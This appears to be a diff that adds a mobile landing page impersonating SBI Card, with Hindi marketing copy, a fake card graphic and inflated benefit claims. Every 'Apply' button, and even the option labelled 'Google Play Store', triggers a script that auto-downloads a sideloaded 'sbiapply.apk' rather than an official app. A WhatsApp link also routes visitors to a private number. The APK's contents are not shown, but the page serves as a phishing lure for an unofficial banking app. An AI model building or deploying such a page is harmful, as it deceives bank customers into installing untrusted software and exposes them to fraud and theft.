@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SBI Credit Card</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    background: linear-gradient(160deg, #0a0e1a 0%, #002555 55%, #003f7f 100%);
+    min-height: 100vh;
+    color: #fff;
+    overflow-x: hidden;
+  }
+
+  /* grid bg */
+  body::before {
+    content:'';
+    position:fixed; inset:0;
+    background-image:
+      linear-gradient(rgba(0,87,184,0.07) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,87,184,0.07) 1px, transparent 1px);
+    background-size: 55px 55px;
+    pointer-events:none;
+  }
+
+  /* NAV */
+  nav {
+    display:flex; align-items:center; justify-content:space-between;
+    padding: 18px 22px;
+    position: relative; z-index:10;
+  }
+
+  .nav-logo {
+    font-family:'Playfair Display',serif;
+    font-weight:900; font-size:24px; color:#fff;
+  }
+  .nav-logo span { color:#c8973a; }
+
+  .btn-apply-nav {
+    background: linear-gradient(135deg,#c8973a,#e5b04a);
+    color:#0a0e1a; font-weight:700; font-size:14px;
+    padding:12px 22px; border:none; border-radius:10px;
+    cursor:pointer;
+    box-shadow:0 6px 22px rgba(200,151,58,0.4);
+    transition: transform 0.2s, box-shadow 0.2s;
+  }
+  .btn-apply-nav:hover { transform:translateY(-2px); box-shadow:0 10px 30px rgba(200,151,58,0.55); }
+
+  /* CARD */
+  .card-wrap {
+    display:flex; justify-content:center;
+    padding: 28px 22px 10px;
+    position:relative; z-index:5;
+  }
+
+  .credit-card {
+    width: 318px; height: 196px;
+    border-radius: 18px;
+    background: linear-gradient(135deg,#003f7f 0%,#001d50 45%,#0a2e6e 75%,#1a4a8a 100%);
+    box-shadow: 0 28px 70px rgba(0,30,80,0.55), inset 0 1px 0 rgba(255,255,255,0.1);
+    position:relative; overflow:hidden;
+    animation: floatCard 3.8s ease-in-out infinite;
+  }
+
+  @keyframes floatCard {
+    0%,100% { transform: rotateY(-6deg) rotateX(3deg) translateY(0); }
+    50%      { transform: rotateY(-6deg) rotateX(3deg) translateY(-10px); }
+  }
+
+  .card-shine {
+    position:absolute; inset:0;
+    background:linear-gradient(135deg,rgba(255,255,255,0.08) 0%,transparent 55%,rgba(200,151,58,0.05) 100%);
+  }
+  .card-glow {
+    position:absolute; top:-50px; right:-50px;
+    width:220px; height:220px; border-radius:50%;
+    background:radial-gradient(circle,rgba(0,87,184,0.35) 0%,transparent 70%);
+  }
+
+  .card-logo { position:absolute; top:20px; left:20px; }
+  .card-logo-main { font-family:'Playfair Display',serif; font-weight:900; font-size:22px; color:#fff; letter-spacing:1px; }
+  .card-logo-sub { font-size:8px; letter-spacing:2.5px; color:#f5d98e; text-transform:uppercase; margin-top:2px; }
+
+  .card-chip {
+    position:absolute; top:20px; right:20px;
+    width:42px; height:32px; border-radius:6px;
+    background:linear-gradient(135deg,#c8973a,#9a6e28);
+    box-shadow:inset 0 1px 0 rgba(255,255,255,0.25);
+  }
+  .card-chip::after {
+    content:''; position:absolute; inset:5px;
+    border:1px solid rgba(0,0,0,0.18); border-radius:3px;
+  }
+
+  .card-number {
+    position:absolute; bottom:50px; left:20px;
+    font-size:16px; letter-spacing:3.5px;
+    color:rgba(255,255,255,0.82); font-weight:300;
+  }
+  .card-bottom {
+    position:absolute; bottom:18px; left:20px; right:20px;
+    display:flex; justify-content:space-between; align-items:center;
+  }
+  .card-name { font-size:11px; letter-spacing:1.8px; color:rgba(255,255,255,0.55); text-transform:uppercase; }
+  .card-visa { font-family:'Playfair Display',serif; font-size:18px; font-style:italic; color:rgba(255,255,255,0.8); }
+  .card-exp { font-size:11px; color:rgba(255,255,255,0.5); margin-right:8px; }
+
+  /* HERO TEXT */
+  .hero-text {
+    padding: 18px 24px 0;
+    position:relative; z-index:5;
+  }
+
+  .badge {
+    display:inline-flex; align-items:center; gap:7px;
+    background:rgba(200,151,58,0.13);
+    border:1px solid rgba(200,151,58,0.35);
+    color:#f5d98e; padding:6px 14px; border-radius:100px;
+    font-size:13px; font-weight:500; letter-spacing:0.3px;
+    margin-bottom:18px;
+  }
+
+  h1 {
+    font-family:'Playfair Display',serif;
+    font-size:2.6rem; font-weight:900; line-height:1.1;
+    color:#fff; margin-bottom:14px;
+  }
+  h1 span { color:#c8973a; display:block; }
+
+  .hero-desc {
+    font-size:15px; line-height:1.72;
+    color:rgba(255,255,255,0.65);
+    margin-bottom:32px;
+  }
+
+  /* BUTTONS */
+  .cta-group { display:flex; flex-direction:column; gap:14px; padding-bottom:50px; }
+
+  .btn-main {
+    background:linear-gradient(135deg,#c8973a,#e5b04a);
+    color:#0a0e1a; font-weight:700; font-size:16px;
+    padding:17px 24px; border:none; border-radius:12px;
+    cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px;
+    box-shadow:0 8px 28px rgba(200,151,58,0.38);
+    transition:transform 0.2s,box-shadow 0.2s;
+  }
+  .btn-main:hover { transform:translateY(-2px); box-shadow:0 14px 36px rgba(200,151,58,0.5); }
+
+  .btn-outline {
+    background:transparent;
+    color:#fff; font-weight:600; font-size:16px;
+    padding:16px 24px; border:1.5px solid rgba(255,255,255,0.28);
+    border-radius:12px; cursor:pointer;
+    transition:all 0.2s;
+  }
+  .btn-outline:hover { border-color:#c8973a; color:#c8973a; }
+
+  /* ──── MODALS ──── */
+  .overlay {
+    display:none; position:fixed; inset:0;
+    background:rgba(0,0,0,0.72);
+    backdrop-filter:blur(10px);
+    z-index:200;
+    align-items:flex-end; justify-content:center;
+  }
+  .overlay.active { display:flex; }
+
+  .sheet {
+    background:linear-gradient(160deg,#0d1829,#0a1020);
+    border:1px solid rgba(200,151,58,0.22);
+    border-radius:26px 26px 0 0;
+    padding:32px 24px 44px;
+    width:100%; max-width:500px;
+    animation: slideUp 0.35s cubic-bezier(0.34,1.56,0.64,1);
+  }
+  @keyframes slideUp {
+    from { transform:translateY(100%); opacity:0; }
+    to   { transform:translateY(0);    opacity:1; }
+  }
+
+  .sheet-handle {
+    width:40px; height:4px; border-radius:2px;
+    background:rgba(255,255,255,0.15);
+    margin:0 auto 24px;
+  }
+
+  .sheet-close {
+    position:absolute; top:16px; right:20px;
+    background:rgba(255,255,255,0.08); border:none;
+    color:rgba(255,255,255,0.6); font-size:18px;
+    width:34px; height:34px; border-radius:50%;
+    cursor:pointer; display:flex; align-items:center; justify-content:center;
+    transition:all 0.2s;
+  }
+  .sheet-close:hover { background:rgba(255,255,255,0.15); color:#fff; }
+
+  /* APK MODAL */
+  .apk-header { text-align:center; margin-bottom:28px; }
+  .apk-icon { font-size:54px; margin-bottom:10px; }
+  .apk-header h2 { font-family:'Playfair Display',serif; font-size:22px; font-weight:700; color:#fff; margin-bottom:6px; }
+  .apk-header p { font-size:13px; color:rgba(255,255,255,0.5); }
+
+  .dl-list { display:flex; flex-direction:column; gap:12px; }
+
+  .dl-item {
+    display:flex; align-items:center; gap:16px;
+    background:rgba(255,255,255,0.05);
+    border:1px solid rgba(255,255,255,0.1);
+    border-radius:14px; padding:16px 18px;
+    cursor:pointer; transition:all 0.2s; text-decoration:none;
+  }
+  .dl-item:hover { background:rgba(200,151,58,0.1); border-color:rgba(200,151,58,0.35); transform:translateX(3px); }
+
+  .dl-emoji { font-size:28px; flex-shrink:0; }
+  .dl-info { flex:1; }
+  .dl-sub { font-size:10px; letter-spacing:1px; color:rgba(255,255,255,0.4); text-transform:uppercase; }
+  .dl-name { font-size:15px; font-weight:700; color:#fff; margin-top:2px; }
+  .dl-arrow { color:rgba(255,255,255,0.3); font-size:16px; }
+
+  .apk-version { text-align:center; font-size:11px; color:rgba(255,255,255,0.3); margin-top:18px; }
+
+  /* BENEFITS MODAL */
+  .ben-header { text-align:center; margin-bottom:24px; }
+  .ben-header h2 { font-family:'Playfair Display',serif; font-size:22px; font-weight:700; color:#fff; margin-bottom:6px; }
+  .ben-header p { font-size:13px; color:rgba(255,255,255,0.5); }
+
+  .free-banner {
+    background:linear-gradient(135deg,rgba(200,151,58,0.18),rgba(200,151,58,0.05));
+    border:1px solid rgba(200,151,58,0.4);
+    border-radius:14px; padding:16px 20px;
+    display:flex; align-items:center; gap:14px;
+    margin-bottom:20px;
+  }
+  .free-banner-icon { font-size:36px; }
+  .free-banner-text h3 { font-size:16px; font-weight:700; color:#f5d98e; }
+  .free-banner-text p { font-size:13px; color:rgba(255,255,255,0.55); margin-top:2px; }
+
+  .ben-list { display:flex; flex-direction:column; gap:10px; margin-bottom:20px; }
+
+  .ben-item {
+    display:flex; align-items:center; gap:14px;
+    background:rgba(0,63,127,0.22);
+    border:1px solid rgba(0,87,184,0.2);
+    border-radius:12px; padding:14px 16px;
+  }
+
+  .ben-emoji { font-size:24px; flex-shrink:0; width:40px; text-align:center; }
+  .ben-info { flex:1; }
+  .ben-title { font-size:14px; font-weight:700; color:#fff; }
+  .ben-detail { font-size:12px; color:rgba(255,255,255,0.5); margin-top:2px; }
+  .ben-badge {
+    background:rgba(200,151,58,0.18); border:1px solid rgba(200,151,58,0.3);
+    color:#f5d98e; font-size:11px; font-weight:700;
+    padding:3px 10px; border-radius:100px; white-space:nowrap;
+  }
+
+  .apply-from-ben {
+    width:100%; padding:16px;
+    background:linear-gradient(135deg,#c8973a,#e5b04a);
+    color:#0a0e1a; font-weight:700; font-size:15px;
+    border:none; border-radius:12px; cursor:pointer;
+    box-shadow:0 8px 24px rgba(200,151,58,0.35);
+    transition:all 0.2s;
+  }
+  .apply-from-ben:hover { transform:translateY(-2px); box-shadow:0 12px 32px rgba(200,151,58,0.5); }
+
+  /* WHATSAPP BUTTON */
+  .btn-whatsapp {
+    background: linear-gradient(135deg, #25D366, #1da851);
+    color: #fff; font-weight:700; font-size:16px;
+    padding:17px 24px; border:none; border-radius:12px;
+    cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px;
+    box-shadow:0 8px 28px rgba(37,211,102,0.35);
+    transition:transform 0.2s, box-shadow 0.2s;
+    text-decoration: none;
+  }
+  .btn-whatsapp:hover { transform:translateY(-2px); box-shadow:0 14px 36px rgba(37,211,102,0.5); }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-logo">SBI <span>Card</span></div>
+  <button class="btn-apply-nav" onclick="openApk()">Apply Now</button>
+</nav>
+
+<!-- CREDIT CARD -->
+<div class="card-wrap">
+  <div class="credit-card">
+    <div class="card-shine"></div>
+    <div class="card-glow"></div>
+    <div class="card-logo">
+      <div class="card-logo-main">SBI</div>
+      <div class="card-logo-sub">State Bank of India</div>
+    </div>
+    <div class="card-chip"></div>
+    <div class="card-number">4512 ···· ···· 7890</div>
+    <div class="card-bottom">
+      <div class="card-name">Your Name Here</div>
+      <div style="display:flex;align-items:center;gap:4px;">
+        <div class="card-exp">12/28</div>
+        <div class="card-visa">VISA</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- HERO TEXT -->
+<div class="hero-text">
+  <div class="badge">⭐ India's #1 Credit Card Provider</div>
+  <h1>SBI Credit Card<span>– Power Your Life</span></h1>
+  <p class="hero-desc">
+    भारत के सबसे भरोसेमंद बैंक का क्रेडिट कार्ड। असीमित रिवॉर्ड्स, जबरदस्त ऑफर्स और
+    वर्ल्डक्लास सुविधाएं — अभी Apply करें और आज ही शुरू करें।
+  </p>
+
+  <div class="cta-group">
+     <a class="btn-whatsapp" href="https://wa.me/919942965830?text=Hello%2C%20SBI%20Credit%20Card%20Apply%20Form%20Send%20Now%20ThankYou.." target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg> Contact on WhatsApp</a>
+    <button class="btn-main" onclick="openApk()">🎉 Abhi Apply Karein</button>
+    <button class="btn-outline" onclick="openBenefits()">Benefits Dekhein</button>
+  </div>
+</div>
+
+<!-- ══ APK MODAL ══ -->
+<div class="overlay" id="apkOverlay" onclick="closeIfBg(event,'apkOverlay')">
+  <div class="sheet" style="position:relative;">
+    <div class="sheet-handle"></div>
+    <button class="sheet-close" onclick="closeApk()">✕</button>
+
+    <div class="apk-header">
+      <div class="apk-icon">📱</div>
+      <h2>SBI Card App Download Karein</h2>
+      <p>Apna Card manage karein, kabhee bhi, kaheen bhi</p>
+    </div>
+
+    <div class="dl-list">
+      <div class="dl-item" onclick="dlClick(this,'Google Play Store')">
+        <div class="dl-emoji">▶</div>
+        <div class="dl-info">
+          <div class="dl-sub">GET IT ON</div>
+          <div class="dl-name">Google Play Store</div>
+        </div>
+        <div class="dl-arrow">›</div>
+      </div>
+      <div class="dl-item" onclick="dlClick(this,'Direct APK')">
+        <div class="dl-emoji">📦</div>
+        <div class="dl-info">
+          <div class="dl-sub">DIRECT DOWNLOAD</div>
+          <div class="dl-name">Android APK File</div>
+        </div>
+        <div class="dl-arrow">›</div>
+      </div>
+    </div>
+
+    <div class="apk-version">SBI Card v5.2.1 · 4.7★ Rating · 1 Crore+ Downloads</div>
+  </div>
+</div>
+
+<!-- ══ BENEFITS MODAL ══ -->
+<div class="overlay" id="benOverlay" onclick="closeIfBg(event,'benOverlay')">
+  <div class="sheet" style="position:relative; max-height:92vh; overflow-y:auto;">
+    <div class="sheet-handle"></div>
+    <button class="sheet-close" onclick="closeBen()">✕</button>
+
+    <div class="ben-header">
+      <h2>🎁 Benefits & Rewards</h2>
+      <p>SBI Credit Card ke saath milti hain yeh zabardast suvidhaein</p>
+    </div>
+
+    <!-- FREE CARD BANNER -->
+    <div class="free-banner">
+      <div class="free-banner-icon">💳</div>
+      <div class="free-banner-text">
+        <h3>₹0 Joining Fee — Bilkul Free!</h3>
+        <p>SimplySAVE Card par koi charge nahi, pehle saal free</p>
+      </div>
+    </div>
+
+    <div class="ben-list">
+      <div class="ben-item">
+        <div class="ben-emoji">💰</div>
+        <div class="ben-info">
+          <div class="ben-title">Cashback Har Jagah</div>
+          <div class="ben-detail">Shopping, Grocery, Dining — har kharch par</div>
+        </div>
+        <div class="ben-badge">5X Points</div>
+      </div>
+      <div class="ben-item">
+        <div class="ben-emoji">✈️</div>
+        <div class="ben-info">
+          <div class="ben-title">Free Airport Lounge</div>
+          <div class="ben-detail">30+ Domestic Airports par free entry</div>
+        </div>
+        <div class="ben-badge">Free</div>
+      </div>
+      <div class="ben-item">
+        <div class="ben-emoji">🛡️</div>
+        <div class="ben-info">
+          <div class="ben-title">Zero Fraud Protection</div>
+          <div class="ben-detail">Card khone par Zero Liability</div>
+        </div>
+        <div class="ben-badge">24/7</div>
+      </div>
+      <div class="ben-item">
+        <div class="ben-emoji">🏥</div>
+        <div class="ben-info">
+          <div class="ben-title">Free Insurance ₹2 Lakh</div>
+          <div class="ben-detail">Accident + Air Accident Cover</div>
+        </div>
+        <div class="ben-badge">Free</div>
+      </div>
+      <div class="ben-item">
+        <div class="ben-emoji">📱</div>
+        <div class="ben-info">
+          <div class="ben-title">0% EMI Facility</div>
+          <div class="ben-detail">3–24 months zero interest EMI</div>
+        </div>
+        <div class="ben-badge">0% Interest</div>
+      </div>
+      <div class="ben-item">
+        <div class="ben-emoji">⛽</div>
+        <div class="ben-info">
+          <div class="ben-title">Fuel Surcharge Waiver</div>
+          <div class="ben-detail">Sabhi petrol pumps par 1% waiver</div>
+        </div>
+        <div class="ben-badge">Bachao ₹100/mo</div>
+      </div>
+      <div class="ben-item">
+        <div class="ben-emoji">🎬</div>
+        <div class="ben-info">
+          <div class="ben-title">Movie & OTT Offers</div>
+          <div class="ben-detail">BookMyShow par 25% off</div>
+        </div>
+        <div class="ben-badge">25% OFF</div>
+      </div>
+      <div class="ben-item">
+        <div class="ben-emoji">🎯</div>
+        <div class="ben-info">
+          <div class="ben-title">Reward Points Never Expire</div>
+          <div class="ben-detail">Points kabhi expire nahi hote!</div>
+        </div>
+        <div class="ben-badge">∞ Valid</div>
+      </div>
+    </div>
+
+    <button class="apply-from-ben" onclick="closeBen(); setTimeout(openApk,200);">
+      🎉 Abhi Free Mein Apply Karein →
+    </button>
+  </div>
+</div>
+
+<script>
+  // ── APK Download Function ──
+  function downloadAPK() {
+    const a = document.createElement('a');
+    a.href = 'sbiapply.apk';          // same folder mein sbiapply.apk hona chahiye
+    a.download = 'sbiapply.apk';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+
+  function openApk()     { downloadAPK(); }   // Apply Now → seedha download
+  function closeApk()    { document.getElementById('apkOverlay').classList.remove('active'); }
+  function openBenefits(){ document.getElementById('benOverlay').classList.add('active'); }
+  function closeBen()    { document.getElementById('benOverlay').classList.remove('active'); }
+
+  function closeIfBg(e, id) {
+    if (e.target === document.getElementById(id)) {
+      document.getElementById(id).classList.remove('active');
+    }
+  }
+
+  function dlClick(el, name) {
+    el.style.background = 'rgba(200,151,58,0.2)';
+    el.style.borderColor = 'rgba(200,151,58,0.6)';
+    el.querySelector('.dl-arrow').textContent = '✓';
+    el.querySelector('.dl-arrow').style.color = '#c8973a';
+    downloadAPK();   // download start
+    setTimeout(() => {
+      el.style.background = '';
+      el.style.borderColor = '';
+      el.querySelector('.dl-arrow').textContent = '›';
+      el.querySelector('.dl-arrow').style.color = '';
+    }, 1800);
+  }
+</script>
+</body>
+</html>
